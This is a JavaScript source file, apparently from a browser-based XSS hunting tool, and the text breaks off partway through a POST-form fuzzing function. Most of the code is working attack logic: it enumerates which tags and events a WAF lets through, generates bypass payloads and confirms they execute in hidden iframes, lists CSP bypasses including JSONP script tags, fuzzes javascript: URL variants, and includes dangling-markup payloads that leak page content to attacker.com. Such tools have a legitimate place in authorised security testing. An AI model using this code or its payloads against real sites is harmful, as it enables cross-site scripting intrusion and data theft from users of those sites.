/**
 * DOM XSS Hunter v4.6 — Fuzzer Tools
 * Standalone fuzz tools: WAF enumeration, CSP detection, JS protocol,
 * dangling markup, POST forms, blind XSS, DOM clobbering, mXSS,
 * prototype pollution, template injection.
 */
(function () {
  'use strict';
  const ns = window.__DOMXSS;
  const { truncate, generateCanary } = ns.utils;
  const { isPayloadReflected, getFillerValue, getCanaryValue } = ns.fuzzerHelpers;
  const CONFIG = ns.CONFIG;
  const WAF_BYPASS_COMBOS = ns.WAF_BYPASS_COMBOS;
  const JS_PROTOCOL_VARIANTS = ns.JS_PROTOCOL_VARIANTS;
  const CSP_BYPASSES = ns.CSP_BYPASSES;

  // =====================================================
  // WAF BYPASS: Tag + Event Enumeration
  // =====================================================
  async function wafEnumerate(options = {}) {
    const opts = {
      targetUrl: null,       // URL to test (default: build from current page form)
      paramName: null,       // URL param to inject into
      useForm: true,         // try to use form GET
      delayMs: CONFIG.delays.wafProbe,          // delay between requests
      ...options,
    };

    ns.log.info('%c\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', 'color:#ff6600;font-weight:bold');
    ns.log.info('%c\u2551   \uD83D\uDEE1\uFE0F WAF BYPASS \u2014 Tag & Event Enumeration              \u2551', 'color:#ff6600;font-weight:bold');
    ns.log.info('%c\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d', 'color:#ff6600;font-weight:bold');

    // Determine the injection point
    let testUrl, paramKey;
    if (opts.targetUrl && opts.paramName) {
      testUrl = opts.targetUrl;
      paramKey = opts.paramName;
    } else {
      // Auto-detect: find a reflected param or use search
      const url = new URL(location.href);
      const params = [...url.searchParams.keys()];
      if (params.length > 0) {
        paramKey = params[0];
        testUrl = url.toString();
      } else {
        // Try to find a search form
        const form = document.querySelector('form[method="get"], form:not([method])');
        if (form) {
          const inp = form.querySelector('input[type="text"], input[type="search"], input:not([type])');
          if (inp?.name) {
            paramKey = inp.name;
            testUrl = new URL(form.action || location.href, location.href).toString();
          }
        }
        if (!paramKey) {
          paramKey = 'search';
          testUrl = location.href;
        }
      }
    }

    ns.log.info(`\uD83C\uDFAF Target: ${truncate(testUrl, 120)}`);
    ns.log.info(`\uD83D\uDD11 Param: ${paramKey}\n`);

    // Helper: test if a payload is reflected
    async function testPayload(payload) {
      try {
        const url = new URL(testUrl);
        url.searchParams.set(paramKey, payload);
        const resp = await fetch(url.toString(), { credentials: 'same-origin', headers: { 'Accept': 'text/html' } });
        if (!resp.ok) return { reflected: false, status: resp.status };
        const html = await resp.text();
        // Smart reflection check — handles server transformations (case changes, added attrs)
        const reflected = isPayloadReflected(payload, html);
        const tagMatch = payload.match(/<(\w+)/);
        const entityEscaped = tagMatch ? html.includes(`&lt;${tagMatch[1]}`) : false;
        // Detect keyword stripping: tag present in payload but stripped from response
        let tagStripped = false;
        if (tagMatch) {
          const tagName = tagMatch[1].toLowerCase();
          tagStripped = !html.toLowerCase().includes(tagName) && html.includes('<');
        }
        return { reflected, entityEscaped, html, status: resp.status, tagStripped };
      } catch (e) {
        return { reflected: false, error: e.message };
      }
    }

    // Binary search helper: recursively split items to find allowed subset
    // Instead of testing N items individually (~N requests), binary search
    // sends batched payloads and splits on failure (~log2(N) requests)
    async function binarySearchAllowed(items, buildPayload, checkResult) {
      // Base case: test individually
      if (items.length <= 2) {
        const results = [];
        for (const item of items) {
          const result = await testPayload(buildPayload(item));
          if (checkResult(result, item)) results.push(item);
          await new Promise(r => setTimeout(r, opts.delayMs));
        }
        return results;
      }

      // Batch test: send all items in one payload separated by markers
      const batchPayload = items.map(item => buildPayload(item)).join('');
      const batchResult = await testPayload(batchPayload);
      await new Promise(r => setTimeout(r, opts.delayMs));

      // WAF blocked batch (400) — test items individually in parallel.
      // Much more efficient than recursive splitting which degrades to O(N log N).
      if (batchResult.status >= 400 || batchResult.error) {
        const confirmed = [];
        let consecutiveEmpty = 0;
        const PARALLEL = 8;
        for (let i = 0; i < items.length; i += PARALLEL) {
          const chunk = items.slice(i, i + PARALLEL);
          const results = await Promise.all(chunk.map(async item => {
            const r = await testPayload(buildPayload(item));
            return { item, result: r };
          }));
          let found = 0;
          for (const { item, result } of results) {
            if (checkResult(result, item)) { confirmed.push(item); found++; }
          }
          // Early bail: if 3 consecutive batches (24 items) yield nothing
          // and we haven't found anything yet, assume all items are blocked
          if (found === 0) {
            consecutiveEmpty++;
            if (consecutiveEmpty >= 3 && confirmed.length === 0) break;
          } else {
            consecutiveEmpty = 0;
          }
          await new Promise(r => setTimeout(r, opts.delayMs));
        }
        return confirmed;
      }
      // If entire batch reflected, all items pass
      if (batchResult.reflected) {
        // Exact payload in response → all items survived, skip individual verification
        if (batchResult.html && batchResult.html.includes(batchPayload)) {
          return items;
        }
        // Smart match only — verify individually (some items may be stripped)
        const confirmed = [];
        const parallelBatch = 8;
        for (let i = 0; i < items.length; i += parallelBatch) {
          const chunk = items.slice(i, i + parallelBatch);
          const results = await Promise.all(chunk.map(async item => {
            const r = await testPayload(buildPayload(item));
            await new Promise(resolve => setTimeout(resolve, opts.delayMs));
            return { item, result: r };
          }));
          for (const { item, result } of results) {
            if (checkResult(result, item)) confirmed.push(item);
          }
        }
        return confirmed;
      }

      // Partial block: split in half and recurse
      const mid = Math.floor(items.length / 2);
      const [left, right] = [items.slice(0, mid), items.slice(mid)];
      const [leftResults, rightResults] = await Promise.all([
        binarySearchAllowed(left, buildPayload, checkResult),
        binarySearchAllowed(right, buildPayload, checkResult),
      ]);
      return [...leftResults, ...rightResults];
    }

    // Phase 1: Find allowed tags (binary search)
    ns.log.info('%c\u2550\u2550 Phase 1: Tag Enumeration \u2550\u2550', 'font-weight:bold;color:#00aaff;font-size:13px');
    const allTags = ns.ALL_TAGS;
    const strippedTags = [];

    const allowedTags = await binarySearchAllowed(
      allTags,
      tag => `<${tag}>`,
      (result, tag) => {
        if (result.reflected) return true;
        if (result.tagStripped) strippedTags.push(tag);
        return false;
      }
    );
    const blockedTags = allTags.filter(t => !allowedTags.includes(t));

    ns.log.info(`   %c\u2705 ${allowedTags.length} tag(s) allowed: %c${allowedTags.join(', ') || '(none)'}`, 'color:#00ff00;font-weight:bold', 'color:#00ff00');

    // Keyword stripping: try bypass variants for stripped tags
    if (strippedTags.length > 0) {
      ns.log.info(`   %c⚡ ${strippedTags.length} tag(s) stripped (keyword removed): %c${strippedTags.join(', ')}`, 'color:#ff6600;font-weight:bold', 'color:#ff6600');
      const KW_BYPASS = ns.KEYWORD_BYPASS_PATTERNS || {};
      for (const tag of strippedTags) {
        const variants = KW_BYPASS[tag];
        if (!variants) continue;
        for (const variant of variants.slice(0, 3)) {
          const result = await testPayload(`<${variant}>`);
          if (result.reflected) {
            allowedTags.push(tag);
            ns.log.info(`   %c✅ Keyword bypass works: <${variant}> → <${tag}>`, 'color:#00ff00;font-weight:bold');
            break;
          }
          await new Promise(r => setTimeout(r, opts.delayMs));
        }
      }
    }

    if (allowedTags.length === 0) {
      ns.log.info('   %c\u274C All tags blocked. Try custom elements or encoding bypasses.', 'color:#ff4444');
      // Test custom elements
      const customResult = await testPayload('<xss>');
      if (customResult.reflected) {
        allowedTags.push('xss');
        ns.log.info('   %c\u2705 Custom element <xss> is allowed!', 'color:#00ff00;font-weight:bold');
      }
    }

    if (allowedTags.length === 0) {
      ns.log.info('\n%c\u274C No tags pass the WAF. Cannot proceed with event enumeration.', 'color:#ff4444;font-weight:bold');
      return { allowedTags, allowedEvents: [], payloads: [], strippedTags };
    }

    // Phase 2: Find allowed events on allowed tags (binary search)
    ns.log.info('\n%c\u2550\u2550 Phase 2: Event Handler Enumeration \u2550\u2550', 'font-weight:bold;color:#00aaff;font-size:13px');
    const allEvents = ns.ALL_EVENTS;
    const testTag = allowedTags.includes('img') ? 'img' : allowedTags.includes('svg') ? 'svg' : allowedTags[0];

    const allowedEvents = await binarySearchAllowed(
      allEvents,
      evt => `<${testTag} ${evt}=1>`,
      (result) => result.reflected
    );

    ns.log.info(`   %c\u2705 ${allowedEvents.length} event(s) allowed: %c${allowedEvents.join(', ') || '(none)'}`, 'color:#00ff00;font-weight:bold', 'color:#00ff00');

    // Phase 3: Generate working payloads from allowed combos
    ns.log.info('\n%c\u2550\u2550 Phase 3: Payload Generation \u2550\u2550', 'font-weight:bold;color:#00aaff;font-size:13px');
    const payloads = [];

    // Try WAF_BYPASS_COMBOS that use allowed tags and events
    for (const combo of WAF_BYPASS_COMBOS) {
      if (!allowedTags.includes(combo.tag)) continue;
      if (combo.event && !allowedEvents.includes(combo.event)) continue;

      let payload;
      if (combo.inner) {
        payload = `<${combo.tag} ${combo.attrs}>${combo.inner}</${combo.tag}>`;
      } else if (combo.event) {
        payload = `<${combo.tag} ${combo.attrs} ${combo.event}=alert(1)>`;
      } else {
        // No event, no inner — attrs-only (e.g. meta refresh)
        payload = `<${combo.tag} ${combo.attrs}>`;
      }
      // Replace PAYLOAD anywhere (attrs, inner, etc.)
      payload = payload.replace(/PAYLOAD/g, 'alert(1)').replace(/\s+/g, ' ').trim();

      const result = await testPayload(payload);
      if (result.reflected) {
        payloads.push({ payload, combo, reflected: true });
        ns.log.info(`   %c\u2705 ${payload}`, 'color:#00ff00;font-weight:bold;font-family:monospace');
      }
    }

    // Auto-fire combos: tag + event that work together
    const autoEvents = ns.AUTO_EVENTS.filter(e => allowedEvents.includes(e));
    for (const tag of allowedTags) {
      for (const evt of autoEvents) {
        const autoInfo = ns.AUTO_FIRE_TAGS[tag];
        if (!autoInfo) continue;
        if (autoInfo.event !== evt) continue;
        // Already tested in WAF_BYPASS_COMBOS? Skip
        if (payloads.some(p => p.combo?.tag === tag && p.combo?.event === evt)) continue;

        const payload = `<${tag} ${autoInfo.attrs} ${evt}=alert(1)>`.replace(/\s+/g, ' ').trim();
        const result = await testPayload(payload);
        if (result.reflected) {
          payloads.push({ payload, tag, event: evt, reflected: true });
          ns.log.info(`   %c\u2705 ${payload}`, 'color:#00ff00;font-weight:bold;font-family:monospace');
        }
      }
    }

    // Custom element with tabindex + onfocus (common WAF bypass for "all standard tags blocked")
    if (allowedTags.includes('xss') || allowedTags.includes('x')) {
      const customTag = allowedTags.includes('xss') ? 'xss' : 'x';
      if (allowedEvents.includes('onfocus')) {
        const payload = `<${customTag} tabindex=1 onfocus=alert(1) id=x>`;
        const result = await testPayload(payload);
        if (result.reflected) {
          payloads.push({ payload: payload + '#x', tag: customTag, event: 'onfocus', reflected: true, needsHash: true });
          ns.log.info(`   %c\u2705 ${payload}#x  (navigate to URL#x to trigger)`, 'color:#00ff00;font-weight:bold;font-family:monospace');
        }
      }
    }

    // Phase 4: Execution Verification via iframe
    const verified = [];
    const reflectedOnly = [];

    if (payloads.length > 0) {
      ns.log.info('\n%c\u2550\u2550 Phase 4: Execution Verification \u2550\u2550', 'font-weight:bold;color:#00aaff;font-size:13px');

      for (const p of payloads) {
        const verifyId = Math.random().toString(36).substring(2, 6);
        // Use void() wrapper for javascript: URI payloads to prevent page navigation
        // (javascript:expr returns expr's value which replaces the page if non-undefined)
        const xssMarker = p.combo?.needsInteraction
          ? `void(window.__xss_${verifyId}=1)`
          : `window.__xss_${verifyId}=1`;
        const verifyPayload = p.payload
          .replace(/alert\s*\(\s*1\s*\)/g, xssMarker);

        const verifyUrl = new URL(testUrl);
        verifyUrl.searchParams.set(paramKey, verifyPayload);
        if (p.needsHash) verifyUrl.hash = 'x';

        try {
          const iframe = document.createElement('iframe');
          iframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0';
          iframe.sandbox = 'allow-same-origin allow-scripts';
          const loaded = new Promise(resolve => {
            iframe.onload = () => resolve(true);
            iframe.onerror = () => resolve(false);
            setTimeout(() => resolve(false), CONFIG.delays.verifyTimeout);
          });
          iframe.src = verifyUrl.toString();
          document.body.appendChild(iframe);
          const ok = await loaded;
          if (ok && iframe.contentWindow) {
            await new Promise(r => setTimeout(r, CONFIG.delays.betweenTests));
            let executed = !!iframe.contentWindow[`__xss_${verifyId}`];
            // For interaction-required payloads (e.g. SVG animate href),
            // simulate a click on the link inside the iframe
            if (!executed && p.combo?.needsInteraction) {
              try {
                const link = iframe.contentDocument?.querySelector('a, [href]');
                if (link) {
                  link.click();
                  await new Promise(r => setTimeout(r, 500));
                  executed = !!iframe.contentWindow[`__xss_${verifyId}`];
                }
              } catch (e) { /* cross-origin or sandbox restriction */ }
            }
            if (executed) {
              p.verified = true;
              verified.push(p);
              ns.log.info(`   %c\u2705 EXECUTES: ${p.payload}`, 'color:#00ff00;font-weight:bold;font-family:monospace');
            } else {
              reflectedOnly.push(p);
              ns.log.info(`   %c\u26A0\uFE0F reflected only: ${p.payload}`, 'color:#ffaa00;font-family:monospace');
            }
          } else {
            reflectedOnly.push(p);
            ns.log.info(`   %c\u26A0\uFE0F reflected only: ${p.payload}`, 'color:#ffaa00;font-family:monospace');
          }
          try { document.body.removeChild(iframe); } catch (e) {}
        } catch (e) {
          reflectedOnly.push(p);
        }
      }
    }

    // Summary
    ns.log.info(`\n%c\u2550\u2550 Results \u2550\u2550`, 'font-weight:bold;color:#ff00ff;font-size:13px');
    if (verified.length > 0) {
      ns.log.info(`%c\uD83D\uDD25 ${verified.length} confirmed XSS payload(s)!`, 'color:#ff0000;font-weight:bold;font-size:14px');
      for (const p of verified) {
        const url = new URL(testUrl);
        url.searchParams.set(paramKey, p.payload);
        if (p.needsHash) url.hash = 'x';
        ns.log.info(`\n   %c${p.payload}`, 'color:#ff0000;font-weight:bold;font-family:monospace;font-size:12px');
        ns.log.info(`   %c\uD83D\uDD17 ${url.toString()}`, 'color:#4488ff;font-family:monospace;font-size:11px');
      }
    }
    if (reflectedOnly.length > 0) {
      ns.log.info(`%c\u26A0\uFE0F ${reflectedOnly.length} reflected but unverified payload(s) (may need interaction or CSP blocks)`, 'color:#ffaa00;font-weight:bold');
      for (const p of reflectedOnly) {
        ns.log.info(`   %c${p.payload}`, 'color:#ffaa00;font-family:monospace');
      }
    }
    if (verified.length === 0 && reflectedOnly.length === 0) {
      ns.log.info('%c\u26A0\uFE0F No working payloads found.', 'color:#ffaa00;font-weight:bold');
      ns.log.info('   Try: encoding bypasses, DOM XSS (fuzz.nav), or AngularJS (frameworks.fuzzAngular)');
    }

    return { allowedTags, blockedTags, allowedEvents, payloads: verified, reflectedOnly, testUrl, paramKey };
  }

  // =====================================================
  // CSP Detection & Analysis
  // =====================================================
  async function detectCSP() {
    ns.log.info('%c\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', 'color:#00aaff;font-weight:bold');
    ns.log.info('%c\u2551   \uD83D\uDEE1\uFE0F CSP ANALYSIS \u2014 Content Security Policy             \u2551', 'color:#00aaff;font-weight:bold');
    ns.log.info('%c\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d', 'color:#00aaff;font-weight:bold');

    // Check HTTP headers first (most CSP is set via response headers)
    let headerCSP = null;
    let reportOnlyCSP = null;
    try {
      const resp = await fetch(location.href, { method: 'HEAD', credentials: 'same-origin' });
      headerCSP = resp.headers.get('Content-Security-Policy');
      reportOnlyCSP = resp.headers.get('Content-Security-Policy-Report-Only');
    } catch (e) { ns.log.debug(e.message); }

    // Check meta tag
    const metaCSP = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    const metaCSPContent = metaCSP?.getAttribute('content') || null;

    // Prefer HTTP header CSP over meta tag (header takes precedence)
    const csp = headerCSP || metaCSPContent || null;

    if (reportOnlyCSP && !csp) {
      ns.log.info('%c\u26A0\uFE0F CSP Report-Only header detected (not enforced):', 'color:#ffaa00;font-weight:bold');
      ns.log.info(`   %c${reportOnlyCSP}`, 'color:#ccc;font-family:monospace;font-size:11px');
      ns.log.info('   This policy is NOT enforced \u2014 inline scripts should work');
    }

    if (!csp) {
      ns.log.info('%c\u2705 No CSP found (checked HTTP headers and meta tags) \u2014 inline scripts should work', 'color:#00ff00;font-weight:bold');
      return { found: false, csp: null, bypasses: [] };
    }

    if (headerCSP) {
      ns.log.info('%c   Source: HTTP response header', 'color:#888');
    } else {
      ns.log.info('%c   Source: <meta> tag', 'color:#888');
    }

    ns.log.info(`%c\uD83D\uDCDC CSP: %c${csp}`, 'font-weight:bold;color:#ffaa00', 'color:#ccc;font-family:monospace;font-size:11px');
    ns.log.info('');

    const directives = {};
    for (const part of csp.split(';')) {
      const tokens = part.trim().split(/\s+/);
      if (tokens.length > 0) directives[tokens[0]] = tokens.slice(1);
    }

    const bypasses = [];

    // Check for common bypasses
    const scriptSrc = directives['script-src'] || directives['default-src'] || [];
    const scriptSrcStr = scriptSrc.join(' ');

    for (const bypass of CSP_BYPASSES) {
      // Handle "missing directive" checks (condition starts with __missing_)
      const missingMatch = bypass.condition.match(/^__missing_(.+)__$/);
      const matches = missingMatch
        ? !directives[missingMatch[1]]   // directive is absent from CSP
        : (scriptSrcStr.includes(bypass.condition) || csp.includes(bypass.condition));
      if (matches) {
        bypasses.push(bypass);
        ns.log.info(`   %c\u26A0\uFE0F ${bypass.desc}`, 'color:#ff6600;font-weight:bold');
        if (bypass.payload) {
          ns.log.info(`      %c${truncate(bypass.payload, 120)}`, 'color:#ff0000;font-family:monospace;font-size:11px');
        }
      }
    }

    if (scriptSrcStr.includes("'unsafe-inline'")) {
      ns.log.info('   %c\u2705 unsafe-inline allowed \u2014 standard XSS payloads work!', 'color:#00ff00;font-weight:bold');
    } else if (scriptSrcStr.includes("'unsafe-eval'")) {
      ns.log.info('   %c\u26A0\uFE0F unsafe-eval allowed \u2014 use eval()/Function() payloads', 'color:#ffaa00;font-weight:bold');
    } else if (scriptSrcStr.includes("'nonce-")) {
      const nonceMatch = scriptSrcStr.match(/'nonce-([^']+)'/);
      if (nonceMatch) {
        ns.log.info(`   %c\uD83D\uDD11 Nonce detected: ${nonceMatch[1]}`, 'color:#ff6600;font-weight:bold');
        ns.log.info('      Look for nonce leaks in the page or use base tag injection');
      }
    } else if (scriptSrcStr.includes("'strict-dynamic'")) {
      ns.log.info('   %c\uD83D\uDD12 strict-dynamic \u2014 look for existing trusted scripts to leverage', 'color:#ffaa00;font-weight:bold');
    } else {
      ns.log.info('   %c\uD83D\uDD12 CSP blocks inline scripts', 'color:#ff4444;font-weight:bold');
    }

    // JSONP callback detection on CSP-whitelisted domains
    const jsonpEndpoints = ns.JSONP_ENDPOINTS || [];
    const jsonpMatches = [];
    for (const ep of jsonpEndpoints) {
      // Check if the JSONP endpoint's domain matches any whitelisted source
      const domainPattern = ep.domain.replace(/\*/g, '[^\\s]*');
      const domainRe = new RegExp(domainPattern.replace(/\./g, '\\.'), 'i');
      if (scriptSrc.some(s => domainRe.test(s))) {
        jsonpMatches.push(ep);
      }
    }
    if (jsonpMatches.length > 0) {
      ns.log.info(`\n   %c\uD83C\uDF10 JSONP Callback CSP Bypass — ${jsonpMatches.length} endpoint(s) on whitelisted domains:`, 'color:#ff6600;font-weight:bold');
      for (const ep of jsonpMatches) {
        const callbackPayload = ep.url.replace('CALLBACK', 'alert(1)');
        ns.log.info(`      %c${ep.desc}`, 'color:#ffaa00');
        ns.log.info(`      %c<script src="${callbackPayload}"></script>`, 'color:#ff0000;font-family:monospace;font-size:11px');
        bypasses.push({ condition: ep.domain, desc: `JSONP: ${ep.desc}`, payload: `<script src="${callbackPayload}"></script>` });
      }
    }

    if (bypasses.length === 0 && !scriptSrcStr.includes("'unsafe-inline'")) {
      ns.log.info('\n   %c\uD83D\uDCA1 Try:', 'font-weight:bold;color:#00aaff');
      ns.log.info('      - Dangling markup: inject unclosed tag to exfiltrate via src/href');
      ns.log.info('      - JSONP endpoints on whitelisted domains');
      ns.log.info('      - Base tag injection to control relative URLs');
      ns.log.info('      - Script gadgets in whitelisted libraries');
    }

    return { found: true, csp, directives, bypasses, reportOnly: reportOnlyCSP, source: headerCSP ? 'http-header' : 'meta-tag' };
  }

  // =====================================================
  // javascript: Protocol Fuzzing (for href injection)
  // =====================================================
  async function fuzzJSProtocol(options = {}) {
    const opts = {
      targetUrl: null,
      paramName: null,
      delayMs: CONFIG.delays.wafProbeAggressive,
      ...options,
    };

    ns.log.info('%c\u2550\u2550 javascript: Protocol Fuzzing \u2550\u2550', 'font-weight:bold;color:#ff6600;font-size:13px');

    let testUrl = opts.targetUrl || location.href;
    let paramKey = opts.paramName;

    if (!paramKey) {
      const url = new URL(location.href);
      const params = [...url.searchParams.keys()];
      paramKey = params[0] || 'url';
    }

    const results = [];

    for (const variant of JS_PROTOCOL_VARIANTS) {
      const payload = `${variant}alert(1)`;
      try {
        const url = new URL(testUrl);
        url.searchParams.set(paramKey, payload);
        const resp = await fetch(url.toString(), { credentials: 'same-origin' });
        if (!resp.ok) continue;
        const html = await resp.text();

        // Check if the javascript: protocol survived
        if (html.includes(variant) || html.toLowerCase().includes('javascript:')) {
          results.push({ variant, payload, url: url.toString() });
          ns.log.info(`   %c\u2705 ${variant}alert(1)`, 'color:#00ff00;font-weight:bold;font-family:monospace');
        }
        await new Promise(r => setTimeout(r, opts.delayMs));
      } catch (e) { ns.log.debug(e.message); }
    }

    if (results.length === 0) {
      ns.log.info('   %c\u274C All javascript: variants blocked', 'color:#ff4444');
    } else {
      ns.log.info(`\n   %c\uD83D\uDD25 ${results.length} variant(s) bypass the filter!`, 'color:#ff0000;font-weight:bold');
    }

    return results;
  }

  // =====================================================
  // Dangling Markup Detection
  // =====================================================
  async function fuzzDanglingMarkup(options = {}) {
    const opts = {
      targetUrl: null,
      paramName: null,
      ...options,
    };

    ns.log.info('%c\u2550\u2550 Dangling Markup Attack \u2550\u2550', 'font-weight:bold;color:#ff6600;font-size:13px');
    ns.log.info('   Testing if unclosed tags can exfiltrate page content via src/href...');

    let testUrl = opts.targetUrl || location.href;
    let paramKey = opts.paramName;
    if (!paramKey) {
      const url = new URL(location.href);
      paramKey = [...url.searchParams.keys()][0] || 'search';
    }

    const danglingPayloads = [
      { payload: '"><img src="//attacker.com/?leak=', desc: 'Unclosed img src (exfil via query)' },
      { payload: '"><a href="//attacker.com/?leak=', desc: 'Unclosed anchor href' },
      { payload: '"><base href="//attacker.com/', desc: 'Base tag hijack' },
      { payload: '"><link rel=stylesheet href="//attacker.com/?', desc: 'Link stylesheet exfil' },
      { payload: '"><meta http-equiv="refresh" content="0;url=//attacker.com/?', desc: 'Meta refresh exfil' },
      { payload: '"><table background="//attacker.com/?', desc: 'Table background exfil' },
    ];

    const results = [];
    for (const dp of danglingPayloads) {
      try {
        const url = new URL(testUrl);
        url.searchParams.set(paramKey, dp.payload);
        const resp = await fetch(url.toString(), { credentials: 'same-origin' });
        if (!resp.ok) continue;
        const html = await resp.text();

        // Check if the dangling tag is reflected with attacker URL intact
        if (html.includes('attacker.com')) {
          results.push(dp);
          ns.log.info(`   %c\u2705 ${dp.desc}: %c${dp.payload}`, 'color:#00ff00;font-weight:bold', 'color:#ccc;font-family:monospace;font-size:11px');
        }
      } catch (e) { ns.log.debug(e.message); }
    }

    if (results.length === 0) {
      ns.log.info('   %c\u274C No dangling markup injection vectors found', 'color:#ff4444');
    } else {
      ns.log.info(`\n   %c\uD83D\uDD25 ${results.length} dangling markup vector(s) found!`, 'color:#ff0000;font-weight:bold');
      ns.log.info('   %cUseful when CSP blocks script execution but page content can be exfiltrated', 'color:#ffaa00');
    }

    return results;
  }

  // =====================================================
  // POST Form Fuzzing
  // =====================================================
  async function fuzzPostForms(options = {}) {
    const opts = {
      delayMs: CONFIG.delays.betweenTests,
      ...options,
    };

    ns.log.info('%c\u2550\u2550 POST Form Fuzzing \u2550\u2550', 'font-weight:bold;color:#ff6600;font-size:13px');

    const forms = document.querySelectorAll('form[method="post"], form[method="POST"]');
    if (forms.length === 0) {
      ns.log.info('   %cNo POST forms found on this page', 'color:#888');
      return [];
    }

    ns.log.info(`   ${forms.length} POST form(s) found`);
    const results = [];

    for (const form of forms) {
      const actionUrl = new URL(form.action || location.href, location.href);
      ns.log.info(`\n   \uD83D\uDCDD Form: ${actionUrl.pathname}`);

      const inputs = form.querySelectorAll('input[name], textarea[name], select[name]');

      // Assign unique canary per editable field
      const fieldCanaryMap = new Map();
      for (const inp of inputs) {
        if (inp.type === 'hidden') {
          inp.value = inp.defaultValue || inp.value || '';
        } else if (inp.type === 'submit' || inp.type === 'file' || inp.type === 'checkbox' || inp.type === 'radio') {
          // Leave as-is
        } else {
          const canary = generateCanary();
          fieldCanaryMap.set(inp.name || '?', { canary, input: inp });
          inp.value = getCanaryValue(canary, inp);
          ns.log.info(`      \uD83D\uDD11 %c${inp.name}%c = %c${canary.base}`, 'color:#00ddff;font-weight:bold', 'color:#ccc', 'color:#888');
        }
      }

      // Fill empty non-hidden fields with filler values
      for (const inp of inputs) {
        if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'file' ||
            inp.type === 'checkbox' || inp.type === 'radio') continue;
        if (!inp.value) inp.value = getFillerValue(inp);
      }

      // Submit form natively via hidden iframe
      let submitIframe = null;
      const origTarget = form.target || '';
      try {
        const iframeName = `__domxss_pf_${Date.now()}`;
        submitIframe = document.createElement('iframe');
        submitIframe.name = iframeName;
        submitIframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
        document.body.appendChild(submitIframe);
        form.target = iframeName;
        const submitDone = new Promise(resolve => {
          submitIframe.onload = () => resolve(true);
          submitIframe.onerror = () => resolve(false);
          setTimeout(() => resolve(false), CONFIG.delays.longTimeout);
        });
        form.submit();
        const loaded = await submitDone;

        // Collect HTML from iframe + stored page
        const htmlSources = [];
        if (loaded && submitIframe.contentDocument) {
          try {
            htmlSources.push({ html: submitIframe.contentDocument.documentElement.outerHTML, label: 'POST response' });
          } catch (e) { ns.log.debug(e.message); }
        }
        await new Promise(r => setTimeout(r, CONFIG.delays.postRedirect));
        try {
          const viewResp = await fetch(location.href, {
            credentials: 'same-origin', headers: { 'Accept': 'text/html' },
            cache: 'no-store',
          });
          if (viewResp.ok) {
            htmlSources.push({ html: await viewResp.text(), label: 'stored (view page)' });
          }
        } catch (e) { ns.log.debug(e.message); }

        // Scan each source for each field's canary
        let anyFound = false;
        for (const { html, label } of htmlSources) {
          for (const [fieldName, { canary }] of fieldCanaryMap) {
            if (!html.includes(canary.base)) continue;
            anyFound = true;

            // Find best context for this field
            let bestCtx = 'html-body';
            let bestElem = '?';
            let bestAnal = null;
            let bestPri = -1;

            let searchFrom = 0;
            while (searchFrom < html.length) {
              const idx = html.indexOf(canary.base, searchFrom);
              if (idx === -1) break;
              searchFrom = idx + canary.base.length;

              const ctxStart = Math.max(0, idx - 200);
              const ctxEnd = Math.min(html.length, idx + canary.full.length + 200);
              const surrounding = html.substring(ctxStart, ctxEnd);
              const fullMatch = html.substring(idx, Math.min(html.length, idx + canary.full.length + 50));
              const anal = analyzeReflection(canary, fullMatch, surrounding);

              const beforeCanary = html.substring(ctxStart, idx);
              let ctx = 'html-body';
              let attrNameFinal = null;
              let tagName = '?';
              const lastOpenTag = beforeCanary.lastIndexOf('<');
              const lastCloseTag = beforeCanary.lastIndexOf('>');
              if (lastOpenTag > lastCloseTag) {
                const tagContent = beforeCanary.substring(lastOpenTag);
                const tagNameMatch = tagContent.match(/^<(\w+)/);
                tagName = tagNameMatch ? tagNameMatch[1].toLowerCase() : '?';
                const dqCount = (tagContent.match(/"/g) || []).length;
                const sqCount = (tagContent.match(/'/g) || []).length;
                const attrMatch = tagContent.match(/([\w-]+)\s*=\s*["']?[^"'<>]*$/);
                attrNameFinal = attrMatch ? attrMatch[1].toLowerCase() : null;
                if (['href', 'src', 'action', 'formaction', 'data', 'srcdoc', 'codebase'].includes(attrNameFinal)) {
                  ctx = 'html-attr-href';
                } else if (attrNameFinal && attrNameFinal.startsWith('on')) {
                  ctx = dqCount % 2 === 1 ? 'js-string-dq' : 'js-string-sq';
                } else if (dqCount % 2 === 1) {
                  ctx = 'html-attr-dq';
                } else if (sqCount % 2 === 1) {
                  ctx = 'html-attr-sq';
                } else {
                  ctx = attrNameFinal ? 'html-attr-uq' : 'html-body';
                }
              }

              let ctxPri = 1;
              if (ctx === 'html-attr-href' || ctx === 'js-url') ctxPri = 10;
